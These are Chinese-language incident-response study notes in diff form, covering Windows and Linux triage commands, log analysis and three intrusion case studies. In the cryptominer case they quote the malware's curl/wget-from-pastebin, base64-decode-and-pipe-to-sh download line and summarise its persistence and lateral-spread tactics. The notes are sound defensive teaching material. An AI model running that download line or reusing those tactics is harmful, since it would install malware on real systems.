@@ -1,0 +1,401 @@
+
+流量分析工具：
+wireshark
+科来
+
+
+
+
+应急响应：所有操作之前先备份.
+
+
+
+应急响应三要义：
+1.先人：与事件发生者了解具体情况(特征、时间、资产等)
+2.后日志：分析系统日志、防火墙日志等了解攻击者动作
+3.再其他：检查网络、进程、端口、文件等.
+
+
+事件分类：
+1.web入侵：
+网站挂马
+页面篡改(挂黑页、js暗链)：特征：黑页、js暗链一般指向黑产地址.
+webshell：出现大马或某些恶意代码.
+网站劫持(js)
+
+2.系统入侵：
+病毒木马、后门
+勒索病毒、挖矿病毒：top查看cpu、内存.
+
+3.信息泄露：撞库、数据库登录(弱口令)
+4.网络攻击：ARP攻击、DNS劫持、DDOS攻击
+
+
+
+
+
+
+
+案例1：hacker通过弱口令获得shell->提权->挂恶意图片、黑页。
+应急步骤：
+1.查看到网页被篡改->先对服务器进行快照备份->同时启用另一台备用服务器提供服务。
+2.对失陷服务器备份克隆后对其现象进行分析审计。
+查看网页源码。发现仅修改了主页和添加了z.png图片。
+3.停止tomcat服务，尝试对主页修复并删除该图片，发现删除后马上又被篡改->猜测存在某个恶意进程(且其不依赖tomcat)->ps -aux    -> 发现可以进程。
+若直接关闭可能产生某些影响，先将其记录。
+4.对tomcat的日志进行审计->发现catalina日志中存在弱口令爆破->发现localhost_access_log日志中有大量请求manager/html页面且返回401的记录，其后发现返回200状态码，故猜测hacker通过爆破tomcat成功获取登录凭证->猜测hacker应该上传了webshell->可能存在常驻恶意代码，成功确定攻击路径。
+5.重启服务器，尝试删除恶意代码和图片，发现又被篡改->猜测后门是开机自启的->查看/etc/ini.d/目录下的脚本和/etc/profile文件，发现可以命令。
+6.对定位到的恶意文件进行分析->发现确为后门程序->猜测hacker是通过利用系统内核漏洞提权的方式获得的root.
+7.使用root权限删除/etc/profile下的恶意代码，删除png文件和恶意代码。
+重启服务器发现恢复正常。
+8.对服务器加固、使用高复杂度的口令、对内核升级。
+
+
+
+
+
+
+
+应急响应步骤：
+1.事件发现
+2.明确事件状态：
+发生时间、网络结构/系统信息、影响范围、事件特征、被攻击主机资产、被攻击后的处理方法、相关人员的联系方式.
+3.提出临时解决方案：备份、断网、下线.
+4.攻击分析
+5.事件处理
+6.事件防御
+
+
+
+
+
+
+windows应急：
+文件分析：重点关注文件创建时间、修改时间、访问时间、查看临时文件夹是否出现病毒、木马等。
+%APPDATA%、%TEMP%
+c:\users\[用户名]\Local Settings\Temp
+c:\documents and settings\[用户名]\Local Settings\Temp
+c:\users\[用户名]\桌面
+c:\documents and settings\[用户名]\桌面
+c:\users\[用户名]\Local Settings\Temporary Internet Files
+c:\documents and settings\[用户名]\Local Settings\Temporary Internet Files
+
+
+运行%UserProfile%\Recent查看快捷方式是否存在异常：
+c:\users\[用户名]\Recent
+c:\documents and settings\[用户名]\Recent
+
+查看逻辑分区目录是否存在异常文件：
+%systemroot%
+%systemroot%\system32\
+
+
+
+
+网络行为分析：
+netstat -anto   //重点关注远程连接、可疑链接
+CLOSE_WAIT状态：对方主动关闭连接或网络异常导致连接中断.
+
+根据异常网络定位PID，再定位到具体进程，常用命令：
+tasklist | findstr pid
+如：
+tasklist | findstr 12996
+
+
+wmic process | findstr "进程名.exe"    //获取进程全路径
+如：
+wmic process | findstr "chrome.exe"
+
+
+查看进程和服务的映射关系：
+tasklist /svc
+
+
+
+
+
+
+流量分析：
+使用wireshark或科来重点关注其访问了哪些域名、url、服务，或哪些外网ip访问了本地主机的哪些端口、服务、目录，使用了何种协议。
+
+
+
+
+
+
+可疑进程分析：可以使用process explorer将目标进程信息上传至VT进行检测.
+tasklist | findstr pid
+wmic process | findstr "进程名.exe"    //获取进程全路径
+
+PC Hunter、process explorer：重点关注没有签名的进程.
+
+
+
+
+自启动程序和定时任务分析：
+Autoruns工具.
+
+
+开始自启动项分析：
+msconfig
+
+
+
+
+系统信息分析：查询系统环境变量和计划任务信息：
+控制面板->管理工具->任务计划程序.
+
+
+
+
+可疑账号分析：
+运行->compmgmt.msc->本地用户和组->用户 重点关注以$结尾的隐藏账户.
+
+
+
+登录会话分析：
+query user  //查看本机所有存活的登录会话
+logoff ID   //下线该ID对应的用户
+
+
+系统版本、补丁信息：
+systeminfo
+
+
+
+日志分析：
+运行->eventvwr
+win日志位置：
+Windows 2000、Server2003、Windows XP：
+\%SystemRoot%\System32\Config\*.evt
+
+Windows Vista/7/10/Server2008：
+\%SystemRoot%\System32\winevt\Logs\*.evt
+
+中间件日志、防火墙日志下载到本地分析(access_log、error_log).
+
+
+
+Log Parser：快速日志分析工具
+
+查看登录事件：
+LogParser.exe -i:EVT -o:DATAGRID "SELECT TimeGenerated as LoginTime FROM Security.evtx where EventID=4624" 
+
+
+
+日志常见编号：
+4624    //登录成功
+4625    //登录失败：账户或密码错误
+4720    //创建用户账户
+4726    //删除用户账户
+
+4768、4776   //域控成功登录事件
+4771、4777   //域控失败登录事件
+
+
+
+类型
+2   Interactive     //交互式登录(本地键盘登录)
+3   Network         //网络(访问共享资源或打印机)
+4   Batch           //批处理(计划任务服务登录)
+7   Unlock          //解锁(离开屏幕一段时间后熄屏启动)
+8   NetworkCleartext    //网络明文(如iis、asp登录)
+10  RemoteInteractiv    //远程登录(RDP/终端服务)
+11  CachedInteractive   //缓存交互(如域登录使用缓存登录)
+
+
+
+
+
+容器、中间件、数据库日志分析：通过关键词、访问频率查看：
+weblogc：$MW_HOME\user_projects\domains\<domain_name>\servers\<server_name>\logs\access.log
+tomcat：Logs目录下localhost_access_log
+apache：access_log
+nginx：access.log
+iis：C:\windows\system32\LogFiles\下的文件
+mysql：Mysqld.log
+oracle、sqlserver：通过配置确定日志文件
+
+
+
+
+
+
+linux应急：
+首先确定命令是否已被替换、判断时间或文件是否变化。
+ls -alt /usr/bin | head -10
+ls -al /bin /usr/bin /usr/sbin/ /sbin/ | grep "Jan 15"
+被替换命令后的处理方式：
+wget https://busybox.net/downloads/binaries/1.30.0-i686/busybox
+chmod +x busybox
+./busybox
+./busybox top       //此top就是正常命令了
+
+
+
+
+文件分析：注意时间.
+tmp、/var/tmp、/etc/init.d/
+ls -alt /tmp/
+
+stat wez.txt    //查看wez.txt文件相关时间
+atime：文件最新访问时间
+mtime：文件最新修改时间
+ctime：文件最新状态时间(如文件权限、链接数等)
+
+
+
+
+查看历史命令：
+cat ~/.bash_history | tail -n 6     //查看最后6条命令
+
+查看定时任务文件是否已被修改：
+crontab -l
+cat /etc/crontab
+cat /var/spool/cron/root
+cat /var/spool/cron/crontabs/root
+cat /etc/cron.d
+
+
+
+新增文件分析：
+查看24小时内已被修改的php文件：
+find wdz/ -name '*.php' -mtime 0
+
+查看wkqz目录下最近4天内更新过的文件：
+find wkqz/ -ctime -4
+
+查看关键文件、账户信息的变化：
+查看特权用户(uid=0)：
+awk -F: '$3==0{print $1}' /etc/passwd
+检测是否存在空口令账户：
+awk -F: 'length($2)==0{print $1}' /etc/shadow
+
+
+查看特殊权限的文件：
+find ./  -perm 777  -name "*.php"
+
+
+查看隐藏文件：
+ls -ar | grep "^\."
+
+
+
+
+
+网络行为和可疑进程分析：
+查看异常网络连接、可疑端口、可疑ip、可疑PID
+netstat -antop | more
+
+通过PID定位到恶意进程：
+ps aux | grep pid
+如：
+ps aux | grep 1675
+
+
+lsof -p procid      //查看进程ID为procid的进程打开的文件列表
+如：
+lsof -p 1347
+
+查看PID为1347的进程所在路径：
+ls -l /proc/1347/exe
+file /proc/1347/exe
+
+
+
+
+日志分析：
+/var/log/messages   //系统启动后的日志和错误日志(最常用)
+/var/log/secure     //安全日志
+/var/log/maillog    //邮件日志
+/var/log/cron       //邮件日志
+/var/log/wtmp       //用户登录成功的记录
+/var/log/btmp       //用户登录失败的记录
+/home/用户名/.bash_history     //用户操作记录日志
+
+
+查看系统用户登录信息：
+lastlog     //最后一次登录本系统的用户登录的时间
+lastb       //登录系统失败的用户信息
+last        //截止目前登陆过系统的用户信息
+who、w       //查看当前登录系统信息(tty为本地登录，pts为远程登录)
+
+
+
+案例2：
+与运维人员了解资产信息->查看用户、发现有异常账户->查看日志，发现某时间段有多次登录最后登录成功->排查危险文件->查看到恶意图片和木马文件->溯源(可通过安全设备日志查看)。
+修复.
+
+
+案例3：挖矿木马(一般都有定时的特征)应急响应
+
+D盾查杀。
+
+top命令查看到kthrotlds进程占用大量cpu资源->kthrotlds为可疑进程，pid为4394->
+lsof -p 4394查看该进程打开的文件以及对外连接情况->发现其向134.209.104.20:51640发起TCP请求且连接成功->将该ip放威胁情报平台查询->结果未知。
+
+lsof -p 4359查看可疑进程->发现大量对104.20.209.21、104.20.208.21的443端口发起TCP连接，符合挖矿特征->挖矿病毒会定时发起请求下载挖矿脚本。通过ip反查获取到域名pastebin.com 地址为美国->
+http://site.ip138.com/104.20.209.21/
+http://site.ip138.com/104.20.208.21
+
+查询进程信息：
+ps -ef | grep kthrotlds         //kthrotlds为进程名
+
+通过日志或文件时间确定攻击者进入服务器的时间：
+ls -al  //查看文件时间
+
+crontab -l  //查看定时任务
+
+
+
+访问地址获取到脚本执行命令为：
+(curl -fsSL https://pastebin.com/raw/D8E71JBJ||wget -q -O- https://pastebin.com/raw/D8E71JBJ)|base64 -d|sh....
+
+下载后base64解密执行。
+分析该挖矿脚本：
+增加了定时任务、删除了安全防护进程、删除了busybox、根据系统信息下载合适的挖矿脚本、停止某些干扰进程、利用ssh横向传播、删除日志信息.
+
+
+解决方案：
+关闭定时任务: 
+systemctl stop crond
+屏蔽下载: 
+busybox echo -e "\n0.0.0.0 pastebin.com\n0.0.0.0 thyrsi.com" >> /etc/hosts
+杀死进程:kill 4394
+杀死进程:kill 4359
+删除挖矿文件:rm -rf /tmp/kthrotlds
+删除挖矿文件:rm -rf /tmp/ksoftirqds
+防火墙封禁对应ip地址.
+
+
+分析起因：
+查看/var/log/auth.log或/var/log/secure日志，发现Accepted(成功爆破)。
+猜测很可能是hacker爆破ssh口令进入进而下载挖矿脚本执行.
+
+
+查看失败记录：
+grep -o "Failed password" /var/log/secure|uniq -c
+
+输出登录爆破的第一行最后一行，确认爆破时间范围：
+grep "Failed password" /var/log/secure|head 1
+grep "Failed password" /var/log/secure|head -1
+
+定位ip：
+grep "Failed password" /var/log/secure|grep -E -o 
+"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"|uniq -c | sort -nr
+
+
+爆破使用的用户名字典：
+grep "Failed password" /var/log/secure|perl -e 'while($_=<>){ /for(.*?) from/; print "$1\n";}'
+
+
+登录成功的日期、用户名、IP：
+grep "Accepted " /var/log/secure | awk '{print $1,$2,$3,$9,$11}'
+
+登录成功的IP：
+grep "Accepted " /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more
+
+
+
+防御：
+严格使用复杂口令、加强访问控制、日志备份。
